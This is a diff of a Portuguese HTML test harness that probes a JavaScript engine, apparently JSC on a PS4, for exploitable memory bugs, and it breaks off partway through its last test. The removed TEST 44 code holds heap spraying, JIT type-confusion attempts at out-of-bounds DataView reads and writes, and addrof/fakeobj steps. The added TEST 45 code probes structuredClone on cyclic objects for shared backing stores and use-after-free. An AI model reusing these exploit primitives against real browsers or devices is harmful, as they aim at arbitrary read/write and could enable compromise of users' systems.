@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 44 — Arbitrary Read/Write: Caminhos Restantes</title></head>
+<head><meta charset="UTF-8"><title>TEST 45 — structuredClone Cyclic + Backing Store Leak</title></head>
 <body>
-<h2>TEST 44 — Arbitrary Read/Write via Caminhos Não Testados</h2>
+<h2>TEST 45 — structuredClone Cyclic Bug + Pointer Leak via Copy Inconsistency</h2>
 
-<p><b>Estado atual:</b></p>
+<p><b>Base:</b> TEST 31-B confirmou que <code>structuredClone(ciclico)</code> <b>não lançou</b> excecão
+   — violação da spec (deve lançar DataCloneError).</p>
+<p><b>Hipótese:</b> O clone de um objeto cíclico pode ter estruturas internas inconsistentes
+   que expõem ponteiros de heap.</p>
+
+<p><b>Sub-testes:</b></p>
 <ul>
-  <li>JIT index write → dead store elimination (descartado)</li>
-  <li>Double bits leak via readIdx → motor deoptimiza (descartado)</li>
-</ul>
-<p><b>Novos caminhos:</b></p>
-<ul>
-  <li><b>44-A</b> Heap spray: Float64Array(99999) + spray de TypedArrays → ler backing store pointer como float64</li>
-  <li><b>44-B</b> DataView com fake length como byte offset — DataView.getFloat64(fakeOffset)</li>
-  <li><b>44-C</b> Stale butterfly: colocar TypedArray no slot pós-getter → slice lê backing store como double</li>
-  <li><b>44-D</b> Se addrof confirmado: corromper length de TypedArray via postMessage cyclic buffer</li>
+  <li><b>45-A</b> structuredClone de objeto cíclico com TypedArray — o clone compartilha backing store?</li>
+  <li><b>45-B</b> Modificar o original após clone — o clone reflete? (shared backing store = UAF potencial)</li>
+  <li><b>45-C</b> Clone de objeto cíclico com getter definido — o getter é preservado? (prototype chain confusion)</li>
+  <li><b>45-D</b> Combinar: cyclic + TypedArray transfer + structuredClone para criar estado inconsistente</li>
 </ul>
 
-<pre id="log">Pronto. Execute A → B → C → D em sequência.</pre>
-<button onclick="runA()">44-A: HEAP SPRAY OVERLAP</button>
-<button onclick="runB()">44-B: DATAVIEW FAKE OFFSET</button>
-<button onclick="runC()">44-C: TYPEDARRAY BACKING STORE LEAK</button>
-<button onclick="runD()">44-D: CORROMPER TYPEDARRAY LENGTH</button>
+<pre id="log">Pronto. Execute A → B → C → D.</pre>
+<button onclick="runA()">45-A: CLONE TYPEDARRAY</button>
+<button onclick="runB()">45-B: SHARED BACKING STORE?</button>
+<button onclick="runC()">45-C: GETTER NO CLONE</button>
+<button onclick="runD()">45-D: CLONE + TRANSFER</button>
 
 <script>
 var log = document.getElementById('log');
@@ -29,463 +29,358 @@ function info(m)   { log.textContent += '\n[INFO] ' + m; }
 function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
 function ok(m)     { log.textContent += '\n[OK]   ' + m; }
 function sep()     { log.textContent += '\n' + '-'.repeat(60); }
-
 function forceGC() {
   var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
 }
-
 function f64bits(val) {
-  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = val;
-  var u32 = new Uint32Array(buf);
-  return { lo: u32[0], hi: u32[1],
-    str: '0x'+u32[1].toString(16).padStart(8,'0')+'_'+u32[0].toString(16).padStart(8,'0') };
+  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
+  var u=new Uint32Array(buf);
+  return '0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');
 }
 
-// Detectar padrão de bits que indica ponteiro de heap
-// JSC PS4 (FreeBSD/x86-64 ou ARM): ponteiros de heap tipicamente não são doubles normais
-// JSC 32-bit NaN boxing: hi=0xFFFFFFFF para cell pointers
-function isHeapPointer(val) {
-  if(typeof val !== 'number' || isNaN(val) || !isFinite(val)) return false;
-  var b = f64bits(val);
-  // NaN canônico JSC (0x7ff80000_00000000) — não é ponteiro
-  if(b.hi === 0x7ff80000 && b.lo === 0) return false;
-  // Double normal (exponent em range de doubles representáveis comuns)
-  var exp = (b.hi >>> 20) & 0x7FF;
-  if(exp >= 0x3FE && exp <= 0x40F) return false; // cobre 0.5 .. 32768
-  // Ponteiro típico de heap: hi = 0xFFFFFFFF (JSC 32bit) ou valor grande (64bit ptr)
-  // Em qualquer caso, valor != 0 e != NaN canônico com bits não-normalizados
-  if(b.hi === 0xFFFFFFFF) return { type: 'JSC32_cell', ptr32: b.lo };
-  if(b.hi > 0x00007F00 && b.hi < 0xFFFF0000) return { type: 'ptr64_candidate', hi: b.hi, lo: b.lo };
-  return false;
-}
-
-// ─── 44-A ─────────────────────────────────────────────────────────────────
+// ─── 45-A ─────────────────────────────────────────────────────────────────
 function runA() {
-  log.textContent = '[TEST 44-A] Heap spray: Float64Array(99999) overlapping com TypedArray interno\n';
+  log.textContent = '[TEST 45-A] structuredClone de objeto cíclico com TypedArray\n';
   sep();
-  info('Primitivo: Float64Array(99999) = 800KB alocados (36-C confirmado).');
-  info('Técnica: alocar bigF64, depois spray de Uint32Array pequenos.');
-  info('Se o heap alocou um Uint32Array DENTRO do range do bigF64,');
-  info('podemos ver o backing store pointer do Uint32Array como float64 em bigF64.\n');
-  info('Em JSC, um TypedArray no heap tem estrutura:');
-  info('  [JSCell header 8B][butterfly ptr 8B][backing store ptr 8B][length 4B]...');
-  info('Se lemos bigF64[offset] onde offset aponta para o backing store ptr,');
-  info('o float64 lido contém o endereço do buffer do Uint32Array.\n');
+  info('31-B confirmou: structuredClone(ciclico) não lança DataCloneError.');
+  info('Verificando: o clone de um TypedArray dentro de um ciclo compartilha o backing store?\n');
 
-  // Passo 1: alocar o bigF64 via primitivo real (strLen=99999)
-  // Por ora usar 99999 direto (o primitivo JIT confirmado retornou esse valor)
-  var FAKE_LEN = 99999;
-  var bigF64;
+  // Criar TypedArray com dados conhecidos
+  var origBuf = new ArrayBuffer(256);
+  var origU32 = new Uint32Array(origBuf);
+  for(var i=0;i<64;i++) origU32[i] = 0xAABB0000 + i;
+  info('origU32[0]=0x' + origU32[0].toString(16) + ' origU32[63]=0x' + origU32[63].toString(16));
+
+  // Objeto cíclico com o TypedArray
+  var cyclic = {
+    id: 'test45A',
+    arr: origU32,
+    buf: origBuf,
+    self: null
+  };
+  cyclic.self = cyclic;
+
+  // structuredClone do cíclico
+  var clone = null;
   try {
-    bigF64 = new Float64Array(FAKE_LEN);
-    info('bigF64 alocado: length=' + bigF64.length + ' byteLength=' + bigF64.byteLength);
+    clone = structuredClone(cyclic);
+    info('structuredClone(cyclic) não lançou!');
+    info('clone.id: ' + clone.id);
+    info('clone.arr instanceof Uint32Array: ' + (clone.arr instanceof Uint32Array));
+    if(clone.arr instanceof Uint32Array) {
+      info('clone.arr.length: ' + clone.arr.length);
+      info('clone.arr[0]: 0x' + clone.arr[0].toString(16));
+      info('clone.arr === origU32: ' + (clone.arr === origU32));
+      info('clone.arr.buffer === origBuf: ' + (clone.arr.buffer === origBuf));
+
+      if(clone.arr === origU32) {
+        alerta('CLONE COMPARTILHA A MESMA REFERÊNCIA DO TYPEDARRAY!\n' +
+               'structuredClone deveria criar uma cópia independente.\n' +
+               'Se clone.arr === origU32, qualquer modificação em um afeta o outro.\n' +
+               'Isso é um bug de aliasing em objetos cíclicos!');
+      } else if(clone.arr.buffer === origBuf) {
+        alerta('CLONE COMPARTILHA O MESMO ARRAYBUFFER!\n' +
+               'clone.arr é uma nova view mas sobre o MESMO backing store!\n' +
+               'Modificar origBuf via origU32 afeta clone.arr e vice-versa.\n' +
+               'Isso é um shared backing store não intencional!');
+      } else {
+        ok('Clone tem backing store independente. Verificando se os dados são iguais...');
+        var match = true;
+        for(var i=0;i<64;i++) {
+          if(clone.arr[i] !== origU32[i]) { match=false; break; }
+        }
+        info('Dados idênticos: ' + match);
+        info('clone.arr.buffer.byteLength: ' + clone.arr.buffer.byteLength);
+      }
+
+      // Verificar o ciclo no clone
+      info('\nVerificando ciclo no clone:');
+      info('clone.self === clone: ' + (clone.self === clone));
+      if(clone.self === clone) {
+        info('Ciclo preservado no clone!');
+      }
+      info('clone.self.arr === clone.arr: ' + (clone.self && clone.self.arr === clone.arr));
+    }
   } catch(e) {
-    alerta('Falha ao alocar Float64Array(' + FAKE_LEN + '): ' + e.message);
+    ok('structuredClone lançou: ' + e.message + ' (comportamento correto pela spec)');
+    info('31-B pode ter sido timing-specific. Retestando...');
+    // Tentar várias vezes
+    for(var attempt=0; attempt<5; attempt++) {
+      try {
+        var c2 = structuredClone(cyclic);
+        alerta('structuredClone NÃO LANÇOU em tentativa ' + (attempt+1) + '!');
+        break;
+      } catch(e2) {
+        info('Tentativa ' + (attempt+1) + ': lançou ' + e2.message);
+      }
+    }
+  }
+}
+
+// ─── 45-B ─────────────────────────────────────────────────────────────────
+function runB() {
+  log.textContent = '[TEST 45-B] Modificar original após clone — clone reflete a mudança?\n';
+  sep();
+  info('Se o clone compartilhar o backing store (mesmo que indiretamente),');
+  info('modificar o TypedArray original deve afetar o clone.\n');
+
+  var buf = new ArrayBuffer(128);
+  var u32 = new Uint32Array(buf);
+  for(var i=0;i<32;i++) u32[i] = 0xDEAD0000 + i;
+
+  var cyclic = { data: u32, ref: null };
+  cyclic.ref = cyclic;
+
+  var clone = null;
+  try {
+    clone = structuredClone(cyclic);
+    info('Clone criado.');
+  } catch(e) {
+    info('structuredClone lançou: ' + e.message);
     return;
   }
 
-  // Passo 2: spray de Uint32Array dentro do range (alocação após bigF64)
-  var SPRAY_COUNT = 2000;
-  var spray = [];
-  for(var i = 0; i < SPRAY_COUNT; i++) {
-    var u32 = new Uint32Array(16); // 64 bytes cada
-    // Preencher com sentinela único
-    for(var j = 0; j < 16; j++) u32[j] = (0xA0000000 + i * 0x10 + j) >>> 0;
-    spray.push(u32);
-  }
-  info('Spray: ' + SPRAY_COUNT + ' Uint32Array(16) alocados após bigF64.');
-  forceGC();
-
-  // Passo 3: varrer bigF64 procurando bits de ponteiro
-  info('Varrendo bigF64[0..' + Math.min(FAKE_LEN-1, 50000) + '] por bits de heap pointer...');
-  var found = [];
-  var SCAN_LIMIT = Math.min(FAKE_LEN, 50000);
-
-  for(var idx = 0; idx < SCAN_LIMIT; idx++) {
-    var v = bigF64[idx];
-    if(v === undefined || v === 0.0 || (v !== v)) continue;
-    var hp = isHeapPointer(v);
-    if(hp) {
-      found.push({ idx: idx, val: v, bits: f64bits(v).str, type: hp.type,
-                   ptr: hp.ptr32 || hp.lo });
-      if(found.length <= 8) {
-        info('bigF64[' + idx + '] = bits=' + f64bits(v).str + ' → ' + hp.type);
-      }
-    }
+  if(!clone || !(clone.data instanceof Uint32Array)) {
+    info('Clone não contém TypedArray válido. Abortando.');
+    return;
   }
 
-  info('\nTotal de heap pointers encontrados no scan: ' + found.length);
+  info('Antes da modificação:');
+  info('  original u32[0]: 0x' + u32[0].toString(16));
+  info('  clone.data[0]: 0x' + clone.data[0].toString(16));
 
-  if(found.length > 0) {
-    alerta('HEAP POINTERS ENCONTRADOS em bigF64!\n' +
-           'Primeiro: bigF64[' + found[0].idx + '] = ' + found[0].bits + '\n' +
-           'Tipo: ' + found[0].type + '\n' +
-           'Pointer bits: 0x' + (found[0].ptr || 0).toString(16) + '\n\n' +
-           'Estes podem ser backing store pointers dos Uint32Array do spray.\n' +
-           'Para confirmar: verificar se modificar bigF64[idx] corrompe algum spray[N].');
+  // Modificar o original
+  u32[0] = 0xC0FFEE42;
+  u32[1] = 0xDEADBEEF;
+  info('\nApós modificar original (u32[0]=0xC0FFEE42, u32[1]=0xDEADBEEF):');
+  info('  original u32[0]: 0x' + u32[0].toString(16));
+  info('  clone.data[0]: 0x' + clone.data[0].toString(16));
 
-    // Verificar: ler o slot suspeito como u32 e comparar com sentinelas
-    // Se o backing store ptr de spray[K] está em bigF64[idx],
-    // então modificar bigF64[idx] muda onde spray[K] lê/escreve
-    var candidate = found[0];
-    info('\nTentando confirmar: bigF64[' + candidate.idx + '] = backing store de algum spray[]?');
-    info('Antes de qualquer modificação, verificar se spray[N][0] corresponde ao ptr...');
-
-    // O ptr seria o endereço do buffer interno do Uint32Array
-    // Não podemos verificar diretamente sem addrof, mas podemos tentar:
-    // modificar bigF64[candidate.idx] e ver se algum spray[N] fica corrompido
-    var OLD_VAL = bigF64[candidate.idx];
-    // NÃO vamos modificar ainda — marcar para 44-D se addrof confirmado
-    info('bigF64[' + candidate.idx + '] atual: ' + f64bits(OLD_VAL).str);
-    info('(Reservado para 44-D: modificar este slot pode mudar backing store de spray)');
+  if(clone.data[0] === 0xC0FFEE42) {
+    alerta('SHARED BACKING STORE CONFIRMADO!\n' +
+           'Modificar o TypedArray original afetou o clone!\n' +
+           'clone.data[0]=0x' + clone.data[0].toString(16) + '\n\n' +
+           'Isso significa que ambos apontam para o mesmo buffer físico.\n' +
+           'Temos dois "donos" do mesmo buffer → potencial UAF e arbitrary write!');
   } else {
-    ok('Nenhum heap pointer encontrado nos primeiros ' + SCAN_LIMIT + ' slots de bigF64.');
-    info('O heap alocador separou bigF64 dos spray arrays.');
-    info('Próxima estratégia: alocar spray ANTES do bigF64 para overlap diferente.');
+    ok('Clone não foi afetado (backing stores independentes).');
+    info('clone.data[0] ainda = 0x' + clone.data[0].toString(16));
+  }
 
-    // Tentar ordem inversa: spray primeiro, bigF64 depois
-    sep();
-    info('\nVariante: alocar spray ANTES do bigF64...');
-    var preSpray = [];
-    for(var i = 0; i < 500; i++) {
-      var u = new Uint32Array(8);
-      for(var j=0;j<8;j++) u[j] = (0xB0000000 + i*8 + j) >>> 0;
-      preSpray.push(u);
+  // Modificar o clone e ver se o original é afetado
+  clone.data[0] = 0x41414141;
+  info('\nApós modificar clone (clone.data[0]=0x41414141):');
+  info('  original u32[0]: 0x' + u32[0].toString(16));
+  if(u32[0] === 0x41414141) {
+    alerta('WRITE-THROUGH CONFIRMADO! Clone escreveu no original!\n' +
+           'u32[0]=0x41414141 — modificação do clone atingiu o buffer do original!');
+  } else {
+    info('Original não afetado pela escrita no clone (0x' + u32[0].toString(16) + ')');
+  }
+
+  // Verificar Float64Array — se backing stores são diferentes, suas estruturas internas diferem
+  info('\nComparando estruturas internas (Float64Array sobre os mesmos buffers):');
+  var f64_orig = new Float64Array(buf);
+  if(clone.data.buffer) {
+    var f64_clone = new Float64Array(clone.data.buffer);
+    info('f64_orig[0] bits: ' + f64bits(f64_orig[0]));
+    info('f64_clone[0] bits: ' + f64bits(f64_clone[0]));
+    if(f64_orig[0] !== f64_clone[0]) {
+      alerta('BUFFERS TÊM CONTEÚDOS DIFERENTES!\n' +
+             'f64_orig[0]=' + f64_orig[0] + ' vs f64_clone[0]=' + f64_clone[0] + '\n' +
+             'Os backing stores divergiram após as escritas!');
     }
-    var bigF64b = new Float64Array(FAKE_LEN);
-    forceGC();
-    info('bigF64b alocado após preSpray. Varrendo bigF64b...');
-    var foundB = 0;
-    for(var idx=0; idx < Math.min(FAKE_LEN, 20000); idx++) {
-      var v = bigF64b[idx];
-      if(v && v === v && isFinite(v) && isHeapPointer(v)) {
-        foundB++;
-        if(foundB <= 3) info('bigF64b[' + idx + '] = ' + f64bits(v).str);
-      }
-    }
-    info('Heap pointers em bigF64b: ' + foundB);
-    if(foundB > 0) alerta('OVERLAP DETECTADO com preSpray!');
   }
 }
 
-// ─── 44-B ─────────────────────────────────────────────────────────────────
-function runB() {
-  log.textContent = '[TEST 44-B] DataView com fake length como byte offset...\n';
-  sep();
-  info('DataView.prototype.getFloat64(byteOffset) — o motor verifica bounds?');
-  info('Se usarmos o primitivo strLen=99999 como byteOffset em um DataView pequeno,');
-  info('o motor pode não verificar bounds (diferente do TypedArray index).\n');
-
-  // Criar DataView sobre buffer real pequeno
-  var realBuf = new ArrayBuffer(64); // apenas 64 bytes
-  var dv = new DataView(realBuf);
-
-  // Preencher com sentinela
-  var u32 = new Uint32Array(realBuf);
-  for(var i=0;i<16;i++) u32[i] = 0xDEAD0000 + i;
-  info('DataView sobre buffer de 64 bytes. Conteúdo: [0xDEAD0000..0xDEAD000F]');
-
-  // Construir o JIT que retorna 99999 via Symbol.replace
-  var callCount = 0;
-  var phase = ['warmup'];
-  var evilPattern = { [Symbol.replace]: function(str) {
-    callCount++;
-    if(phase[0] === 'warmup') return str;
-    return { toString:function(){return str;}, valueOf:function(){return str;},
-             length: 99999, 0: str[0]||'x' };
-  }};
-
-  // Função JIT que usa strLen como byteOffset no DataView
-  function readViaDataView(s, view) {
-    var offset = s.replace(evilPattern,'').length;
-    // Tentar diferentes métodos de leitura
-    try { return view.getFloat64(offset); } catch(e) { return 'EXC:' + e.message; }
-  }
-  function readU32ViaDataView(s, view) {
-    var offset = s.replace(evilPattern,'').length;
-    try { return view.getUint32(offset); } catch(e) { return 'EXC:' + e.message; }
-  }
-  function readU8ViaDataView(s, view) {
-    var offset = s.replace(evilPattern,'').length;
-    try { return view.getUint8(offset); } catch(e) { return 'EXC:' + e.message; }
-  }
-
-  var base = 'hello world test string pad'; // length normal
-  info('Aquecendo readViaDataView (50k calls)...');
-  phase[0] = 'warmup';
-  for(var w=0;w<50000;w++) {
-    readViaDataView(base, dv);
-    readU32ViaDataView(base, dv);
-    readU8ViaDataView(base, dv);
-  }
-  info('Warmup completo. callCount=' + callCount);
-  sep();
-
-  // Fase ataque: usar offset=99999 no DataView de 64 bytes
-  phase[0] = 'attack';
-  info('Fase ataque: tentando DataView.getFloat64(99999) em buffer de 64 bytes...\n');
-
-  var r1 = readViaDataView(base, dv);
-  info('getFloat64(99999): ' + r1);
-  if(typeof r1 === 'number') {
-    var b = f64bits(r1);
-    info('bits: ' + b.str);
-    var hp = isHeapPointer(r1);
-    if(hp) {
-      alerta('OOB READ via DataView.getFloat64(99999)!\n' +
-             'Leu ' + b.str + ' além dos 64 bytes do buffer!\n' +
-             'Tipo detectado: ' + hp.type + '\n' +
-             'Este é um ponteiro de heap lido via DataView OOB!');
-    } else {
-      info('Valor não parece ponteiro de heap: ' + b.str);
-    }
-  } else {
-    info('getFloat64 resultado: ' + r1);
-    if(typeof r1 === 'string' && r1.indexOf('EXC') === 0) {
-      ok('DataView lançou exceção com offset=99999 — bounds check funcionou: ' + r1);
-    }
-  }
-
-  var r2 = readU32ViaDataView(base, dv);
-  info('getUint32(99999): ' + r2);
-  if(typeof r2 === 'number' && r2 !== 0) {
-    alerta('OOB READ via DataView.getUint32(99999): 0x' + r2.toString(16) + '\n' +
-           'Leu 4 bytes além do buffer de 64 bytes!');
-  }
-
-  var r3 = readU8ViaDataView(base, dv);
-  info('getUint8(99999): ' + r3);
-  if(typeof r3 === 'number' && typeof r3 !== 'undefined') {
-    if(typeof r3 === 'string' && r3.indexOf('EXC') === 0) {
-      ok('getUint8 lançou: ' + r3);
-    } else {
-      alerta('OOB READ via DataView.getUint8(99999): ' + r3 + '\n' +
-             'Um byte além do buffer foi lido!');
-    }
-  }
-
-  // Variante: DataView sobre o bigF64 buffer — usar fake length como write offset
-  sep();
-  info('\nVariante: DataView sobre ArrayBuffer(64), ESCRITA em offset=99999...');
-  function writeViaDataView(s, view, val) {
-    var offset = s.replace(evilPattern,'').length;
-    try { view.setFloat64(offset, val); return 'OK'; } catch(e) { return 'EXC:' + e.message; }
-  }
-  function writeU32ViaDataView(s, view, val) {
-    var offset = s.replace(evilPattern,'').length;
-    try { view.setUint32(offset, val); return 'OK'; } catch(e) { return 'EXC:' + e.message; }
-  }
-  phase[0] = 'warmup';
-  for(var w2=0;w2<50000;w2++) { writeViaDataView(base, dv, 0); writeU32ViaDataView(base, dv, 0); }
-  phase[0] = 'attack';
-  var WRITE_CANARY = 1.23456789012e15;
-  var w1 = writeViaDataView(base, dv, WRITE_CANARY);
-  var w2r = writeU32ViaDataView(base, dv, 0xC0FFEE42);
-  info('setFloat64(99999, canary): ' + w1);
-  info('setUint32(99999, 0xC0FFEE42): ' + w2r);
-  if(w1 === 'OK') {
-    alerta('OOB WRITE via DataView.setFloat64(99999): escrita além dos limites confirmada!\n' +
-           'O motor executou setFloat64 sem verificar bounds com offset=99999 em buffer de 64B!');
-  }
-  if(w2r === 'OK') {
-    alerta('OOB WRITE via DataView.setUint32(99999): escrita de 0xC0FFEE42 além dos limites!');
-  }
-}
-
-// ─── 44-C ─────────────────────────────────────────────────────────────────
+// ─── 45-C ─────────────────────────────────────────────────────────────────
 function runC() {
-  log.textContent = '[TEST 44-C] Stale butterfly: TypedArray no slot pós-getter → slice lê backing store como double\n';
+  log.textContent = '[TEST 45-C] Getter no objeto clonado — preservado no clone?\n';
   sep();
-  info('Técnica clássica de addrof em JSC:');
-  info('  1. Array de doubles: [1.1, 2.2, 0, 0, 5.5]');
-  info('  2. Getter em [2]: muda arr[3] para Uint32Array');
-  info('  3. slice() copia arr[3] = o TypedArray');
-  info('  4. MAS: e se o slot [3] tivesse sido lido como double ANTES do getter?');
-  info('  5. O backing store pointer do TypedArray vaza como double.\n');
-  info('Diferença do teste 38-C: aqui colocamos TypedArray (não objeto genérico).');
-  info('TypedArrays em JSC têm backing store como campo acessível via internals.\n');
+  info('structuredClone normalmente NÃO clona getters/setters (apenas valores).');
+  info('Mas em objeto cíclico onde o clone pode ter inconsistências,');
+  info('verificar se o getter é preservado ou se o valor é snapshotted.\n');
 
-  // Objeto vítima: TypedArray com buffer preenchido
-  var victimBuf = new ArrayBuffer(256);
-  var victimU32 = new Uint32Array(victimBuf);
-  for(var i=0;i<64;i++) victimU32[i] = 0xC0DE0000 + i;
-  // victimU32 é nosso TypedArray vítima
+  var sideEffect_count = 0;
+  var SECRET_VALUE = 0xDEADC0DE;
 
-  // Array de doubles puros
-  var srcArr = [1.1, 2.2, 0.0, 0.0, 5.5];
-  var triggered = false;
-  Object.defineProperty(srcArr, 2, {
+  var objWithGetter = {};
+  Object.defineProperty(objWithGetter, 'secret', {
     get: function() {
-      if(!triggered) {
-        triggered = true;
-        srcArr[3] = victimU32; // colocar TypedArray no slot [3]
-        forceGC();
-        info('Getter[2]: srcArr[3] = victimU32 (TypedArray)');
-      }
-      return 3.3;
+      sideEffect_count++;
+      return SECRET_VALUE;
     },
     configurable: true, enumerable: true
   });
+  objWithGetter.normal = 12345;
 
-  // Aquecer JIT com função que lê srcArr[3]
-  // ANTES de disparar o getter, para forçar especialização em double
-  var srcArrClean = [1.1, 2.2, 3.3, 4.4, 5.5]; // sem getter
-  function readSlot3(a) { return a[3]; }
-  info('Aquecendo readSlot3 com array de doubles puros...');
-  for(var w=0;w<100000;w++) readSlot3(srcArrClean);
-  info('Warmup completo.');
+  // Criar ciclo
+  var cyclic = { payload: objWithGetter, self: null };
+  cyclic.self = cyclic;
 
-  // slice() — vai disparar o getter, copiar TypedArray em [3]
-  info('\nChamando srcArr.slice()...');
-  var sliced = srcArr.slice();
-  info('sliced.length=' + sliced.length);
-  info('typeof sliced[3]: ' + typeof sliced[3]);
+  info('objWithGetter.secret getter configurado (retorna 0xDEADC0DE).');
+  info('sideEffect_count antes do clone: ' + sideEffect_count);
 
-  if(typeof sliced[3] !== 'object') {
-    info('slice() não copiou o TypedArray. Abortando.');
-    return;
-  }
-  info('sliced[3] === victimU32: ' + (sliced[3] === victimU32));
-
-  // Agora: chamar readSlot3 no sliced array
-  // O JIT foi aquecido para doubles, o sliced[3] é TypedArray
-  info('\nChamando readSlot3(sliced) — JIT aquecida para double...');
   try {
-    var result = readSlot3(sliced);
-    info('readSlot3(sliced) = ' + result + ' | typeof=' + typeof result);
-    if(typeof result === 'number') {
-      var b = f64bits(result);
-      info('bits: ' + b.str);
-      var hp = isHeapPointer(result);
-      if(hp) {
-        alerta('ADDROF VIA TYPEDARRAY SLICE!\n' +
-               'readSlot3 retornou double com bits de ponteiro: ' + b.str + '\n' +
-               'Tipo: ' + hp.type + '\n' +
-               'Este pode ser o endereço de victimU32 no heap!\n\n' +
-               'Para confirmar: se modificar backing store em victimBuf altera o que lemos via ptr,\n' +
-               'então temos addrof + arbitrary read confirmados!');
-      } else if(result === 4.4) {
-        info('Retornou 4.4 (valor antigo de srcArrClean[3]) — stale read do warmup!');
-        alerta('STALE READ: JIT retornou valor do array de WARMUP, não do sliced!\n' +
-               'O JIT usou a função cacheada para srcArrClean e retornou srcArrClean[3]=4.4!');
-      } else {
-        info('Valor não reconhecido como ponteiro: ' + b.str);
+    var clone = structuredClone(cyclic);
+    info('Clone criado. sideEffect_count após clone: ' + sideEffect_count);
+
+    if(sideEffect_count > 0) {
+      info('O getter FOI chamado durante a clonagem (' + sideEffect_count + ' vezes)!');
+      info('clone.payload.secret: ' + clone.payload.secret);
+      info('typeof clone.payload.secret getter: ');
+
+      // Verificar se o clone tem o getter ou o valor snapshotted
+      var descriptor = Object.getOwnPropertyDescriptor(clone.payload, 'secret');
+      if(descriptor) {
+        info('  value: ' + descriptor.value);
+        info('  get: ' + (typeof descriptor.get));
+        if(typeof descriptor.get === 'function') {
+          alerta('GETTER PRESERVADO NO CLONE!\n' +
+                 'structuredClone manteve o getter no clone.\n' +
+                 'Isso viola a spec (deve copiar o valor, não o getter).\n' +
+                 'Um getter malicioso em um objeto clonado pode ter side-effects inesperados!');
+        } else {
+          ok('Getter foi convertido para valor: ' + descriptor.value);
+        }
       }
-    } else if(typeof result === 'object') {
-      ok('Motor deoptimizou. result===victimU32: ' + (result === victimU32));
+    } else {
+      info('Getter NÃO foi chamado durante a clonagem.');
+      if(clone.payload) {
+        info('clone.payload.secret: ' + clone.payload.secret);
+        info('(chamou o getter para exibir = count agora ' + sideEffect_count + ')');
+      }
     }
   } catch(e) {
-    alerta('EXCECAO em readSlot3(sliced): ' + e.message);
+    info('structuredClone lançou: ' + e.message);
   }
 
-  // Variante: Float64Array ao invés de Uint32Array
   sep();
-  info('\nVariante: Float64Array como vítima (backing store ponteiro diferente)...');
-  var victimF64 = new Float64Array(32);
-  for(var i=0;i<32;i++) victimF64[i] = i * 1.111;
+  // Teste de prototype chain confusion
+  info('\nTeste de prototype chain: objeto com prototype custom no clone...');
+  function SpecialClass() { this.data = new Uint32Array(16); }
+  SpecialClass.prototype.readSecret = function() { return 0xBEEFBEEF; };
 
-  var srcArr2 = [10.0, 20.0, 0.0, 0.0, 50.0];
-  var triggered2 = false;
-  Object.defineProperty(srcArr2, 2, {
-    get: function() {
-      if(!triggered2) { triggered2=true; srcArr2[3]=victimF64; forceGC(); }
-      return 30.0;
-    }, configurable:true, enumerable:true
-  });
+  var special = new SpecialClass();
+  var cyclicSpecial = { obj: special, self: null };
+  cyclicSpecial.self = cyclicSpecial;
 
-  var sliced2 = srcArr2.slice();
-  if(typeof sliced2[3] === 'object') {
-    try {
-      var r2 = readSlot3(sliced2);
-      info('readSlot3(sliced2 com F64) = ' + r2 + ' | typeof=' + typeof r2);
-      if(typeof r2 === 'number') {
-        var b2 = f64bits(r2);
-        info('bits: ' + b2.str);
-        if(isHeapPointer(r2)) alerta('ADDROF via Float64Array: ' + b2.str);
-      }
-    } catch(e) { info('Excecao: ' + e.message); }
+  try {
+    var cloneSpecial = structuredClone(cyclicSpecial);
+    info('Clone de SpecialClass criado.');
+    info('cloneSpecial.obj instanceof SpecialClass: ' + (cloneSpecial.obj instanceof SpecialClass));
+    info('typeof cloneSpecial.obj.readSecret: ' + typeof cloneSpecial.obj.readSecret);
+    if(typeof cloneSpecial.obj.readSecret === 'function') {
+      alerta('PROTOTYPE PRESERVADO NO CLONE!\n' +
+             'cloneSpecial.obj tem o método readSecret() do prototype de SpecialClass!\n' +
+             'structuredClone deveria criar plain objects, não instâncias de classes.');
+    } else {
+      ok('Prototype não preservado (comportamento correto).');
+    }
+    if(cloneSpecial.obj.data instanceof Uint32Array) {
+      info('cloneSpecial.obj.data é Uint32Array: ' + cloneSpecial.obj.data.length + ' elementos');
+    }
+  } catch(e) {
+    info('structuredClone(SpecialClass) lançou: ' + e.message);
   }
 }
 
-// ─── 44-D ─────────────────────────────────────────────────────────────────
+// ─── 45-D ─────────────────────────────────────────────────────────────────
 function runD() {
-  log.textContent = '[TEST 44-D] Se addrof confirmado: corromper length de TypedArray via postMessage\n';
+  log.textContent = '[TEST 45-D] Clone + Transfer: criar estado inconsistente\n';
   sep();
-  info('Este teste pressupõe que 44-A ou 44-C encontraram um heap pointer.');
-  info('Se sim, demonstrar o next step: usar o endereço para construir fakeobj.\n');
-  info('Sem addrof confirmado: testar variante alternativa de arbitrary read');
-  info('usando o buffer leak (Vuln #1) para vazar conteúdo de buffers arbitrários.\n');
-  sep();
+  info('Combinar Vuln #1 (buffer leak via postMessage) com structuredClone.');
+  info('\nCenário:');
+  info('1. Criar TypedArray A com buffer X');
+  info('2. structuredClone(cyclic_with_A) → cloneA com buffer Y (cópia)');
+  info('3. postMessage(cyclic_with_A, *, [X]) → transfer X no remetente');
+  info('4. O cloneA ainda aponta para Y (cópia feita antes do transfer)');
+  info('5. Mas se cloneA.buffer === X (shared backing store) → cloneA lê buffer transferido!\n');
 
-  info('=== VARIANTE: Arbitrary Read via Cyclic Buffer Leak ===\n');
-  info('O buffer leak (Vuln #1) permite vazar qualquer ArrayBuffer que seja');
-  info('referenciado dentro de um objeto cíclico, mesmo após transfer.');
-  info('Se conseguirmos fazer um objeto apontar para um buffer com dados sensíveis');
-  info('e colocá-lo num ciclo postMessage, o receptor lê os dados.\n');
+  var buf = new ArrayBuffer(512);
+  var u32 = new Uint32Array(buf);
+  for(var i=0;i<128;i++) u32[i] = 0xFEED0000 + i;
+  info('buf criado: u32[0]=0x' + u32[0].toString(16));
 
-  info('Demonstração: vazar o conteúdo de um ArrayBuffer "privado"');
-  info('que o remetente acredita ter protegido via transfer.\n');
+  var cyclic = { arr: u32, buf: buf, id: 'clone_transfer_test', self: null };
+  cyclic.self = cyclic;
 
-  // Simular um buffer "privado" com conteúdo estruturado
-  var privateBuf = new ArrayBuffer(1024);
-  var pvt32 = new Uint32Array(privateBuf);
